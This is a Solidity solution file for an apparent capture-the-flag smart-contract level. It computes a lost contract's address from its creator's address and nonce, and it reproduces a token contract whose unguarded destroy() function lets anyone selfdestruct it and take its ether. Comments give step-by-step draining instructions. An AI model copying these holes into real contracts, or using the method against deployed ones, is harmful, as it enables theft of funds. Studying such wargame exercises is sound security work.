// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {

  function hack() public view returns (address){
    address addr = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), 0x075A160F3cD93175D7FC2A02f7598Cf3EfEC2297, bytes1(0x01)))))); //3rd argument is the address of contract creator(get from level instance). 4th argument is a value 1 assuming only 1 transaction has happened
    // ADD some more clear explanation of this method.
    return addr;
  }
}

contract SimpleToken {

  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value * 10;
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender] - _amount;
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}

// How to hack - 
// 1) Find the lost contract address by calling hack function in Hack contract.
// 2) Use that address to load the SimpleToken contract in Remix and call destroy function to send ether from this contract to any address.
